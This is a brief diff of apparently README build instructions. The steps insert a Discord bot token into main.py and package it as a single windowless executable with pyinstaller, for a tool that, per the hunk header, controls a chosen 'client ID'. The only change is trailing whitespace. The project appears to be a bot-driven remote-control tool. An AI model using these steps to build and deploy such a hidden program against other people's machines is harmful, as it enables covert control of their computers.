@@ -142,4 +142,4 @@ change {ID} to the client ID wich you want to control.
 34. Go back to the developer portal and go to "Bot" > "Copy" To copy the token. or you have to click "Reset" and then copy the token.
 35. Open The Idle to change "main.py". Scroll till you see: BOT_TOKEN = "[BOT_TOKEN_HERE]". Replace [BOT_TOKEN_HERE] with your Copied Bot token setup earlier
 36. Open the cmd window again. now type: ```pyinstaller main\main.py --onefile --noconsole --i \ico\exe.ixo``` and hit "Enter"
-37. You can find the exe in the dist dir.
+37. You can find the exe in the dist dir. 
